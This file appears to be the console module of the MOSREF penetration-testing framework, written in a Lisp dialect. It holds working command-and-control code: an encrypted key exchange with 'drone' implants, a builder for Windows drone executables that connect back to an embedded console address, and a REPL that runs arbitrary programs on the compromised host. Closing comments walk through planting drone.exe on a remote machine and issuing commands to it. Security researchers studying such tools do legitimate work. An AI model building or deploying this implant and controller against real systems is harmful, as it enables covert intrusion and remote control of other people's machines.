; Copyright (C) 2006, Ephemeral Security, LLC
; 
; This library is free software; you can redistribute it and/or modify it 
; under the terms of the GNU Lesser General Public License, version 2.1
; as published by the Free Software Foundation.
; 
; This library is distributed in the hope that it will be useful, but WITHOUT 
; ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or 
; FITNESS FOR A PARTICULAR PURPOSE. See the GNU Lesser General Public License 
; for more details.
; 
; You should have received a copy of the GNU Lesser General Public License 
; along with this library; if not, write to the Free Software Foundation, 
; Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA 

(module "mosref/console")

(import "mosref/base")

(import "lib/cfb")
(import "lib/fuse")
(import "lib/crypto-port")
(import "lib/freeze")
(import "lib/format")
(import "lib/build")

(export console-affiliation console-repl drone-exec make-drone-exe 
        make-console-ecdh)

(define (make-console-ecdh) (make-ecdh-key *ecdh-keysize*))

(define (console-affiliation session-ecdh port)
  ;;;TODO: Configure timeout.

  (define console-iv (make-iv))
 
  ;;; Drone --> Console, via plaintext, Dp
  (define drone-ecdh (import-ecdh (read 59 port)))
  (define aes-key (make-aes-key 256 
                                (ecdh-shared-secret session-ecdh drone-ecdh)))

  ;;; Drone --> Console, via KK, DD
  (define drone-iv (aes-decrypt aes-key (read 16 port)))

  ;;; Console --> Drone, via KK, CC
  (write (aes-encrypt aes-key console-iv) port)
 
  (define report-key (make-cfb aes-key drone-iv aes-encrypt))
  (define command-key (make-cfb aes-key console-iv aes-encrypt))
  
  (define report-port (decrypt-input port report-key cfb-decrypt))
  (define command-port (encrypt-output port command-key cfb-encrypt))

  ;;; Drone --> Console, via RK, CC
  (unless (string=? (read report-port) console-iv)
    (error 'aff "the drone failed to confirm affiliation"))

  ;;; Console --> Drone, via CK, DD
  (write drone-iv command-port)

  (fuse-ports report-port command-port))

(define (make-drone-exe console-addr console-portno console-ecdh platform)
  (build-exe platform
             `((import "mosref/drone")
               (import "lib/conn")
               (drone-repl
                 (drone-affiliation 
                   (import-ecdh
                     (base64-decode ,(base64-encode (export-public-ecdh 
                                                      console-ecdh))))
                   (open-tcp-connection ,console-addr ,console-portno))))))

(define (drone-exec cmd port)
  (cond 
    ((list? cmd)
     (set! cmd (freeze (assemble (optimize (compile cmd))))))
    ((program? cmd) 
     (set! cmd (freeze cmd)))
    ((string? cmd))
    (else
      (error 'mos "drone-exec accepts a frozen program, program or source")))
  (write cmd port)
  (thaw (read port)))

(define (console-repl port)
  (define (display-result item)
    (write (string-append ":: " (value->string item) *line-sep*)))

  (define (display-failure key info context)
    (write (string-append (apply string-join 
                                 *line-sep*
                                 (string-join " "
                                              "Drone Error:" 
                                              (symbol->string key)
                                              info)
                                 (map (lambda (item) 
                                        (string-append "             " item))
                                      context))
                          *line-sep*)))

  (define (quit-repl cmd)
    (close port))

  (define (drone-cmd cmd)
    (define cmd-ok #t)
    (guard (lambda (e) (write (string-append "Parse Error: " 
                                             (car (error-info e))
                                             *line-sep*))
                       (set! cmd-ok #f))
           (set! cmd (string->exprs cmd)))
    (when cmd-ok
      (define result (drone-exec cmd port))
      (define result-type (car result))
      (set! result (cdr result))
      (case result-type
        ((succ) 
         (for-each display-result result))
        ((fail) 
         (apply display-failure result)))))

  (define cmds 
    (dict (cons (string-append ".quit" *line-sep*)
                quit-repl)))

  (define default-cmd drone-cmd)

  (until (closed? port)
    (write ">> ")
    (define cmd (read))
    (define cmd-fn (dict-ref cmds cmd default-cmd))
    (cmd-fn cmd)))

;;; >> (define listener (spawn-mosref-listener "foo.com" 9191))
;;; :: #f
;;; >> (define session (make-drone-session listener))
;;; :: #f
;;; >> (write-data-file "drone.exe" (make-drone-exe listener "win32"))
;;; :: #f
;;; >> (define drone (await-drone session))
;;; ;; run the drone.exe program on the remote host
;;; :: #f
;;; >> (drone-exec '((write-data-file "/tmp/flag" "Claimed")) drone) 
;;; :: (ok . #f)

